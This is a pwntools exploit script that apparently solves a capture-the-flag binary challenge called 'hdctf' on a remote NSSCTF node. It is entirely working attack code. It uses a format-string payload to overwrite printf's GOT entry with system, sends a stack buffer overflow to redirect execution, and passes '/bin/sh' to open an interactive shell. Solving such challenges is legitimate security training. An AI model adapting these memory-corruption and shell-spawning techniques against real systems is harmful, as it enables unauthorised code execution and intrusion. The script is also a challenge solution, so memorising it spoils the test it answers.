from pwn import *
context.terminal = ["qterminal", "-e"]
context(arch='amd64', os='linux')
context.log_level = "debug"
#p = process("./hdctf")
p=remote('node4.anna.nssctf.cn',28631)
#gdb.attach(p,'b* 0x4007c3')
elf = ELF("./hdctf")
printf_got = elf.got["printf"]
system = elf.plt["system"]
payload = fmtstr_payload(6, {printf_got: system})
p.recvuntil('name: ')
p.sendline(payload)
p.recvuntil('on !')
payload=b'a'*0x58+p64(0x400770)
p.send(payload)
p.recvuntil('name: ')
p.sendline('/bin/sh\x00')
p.interactive()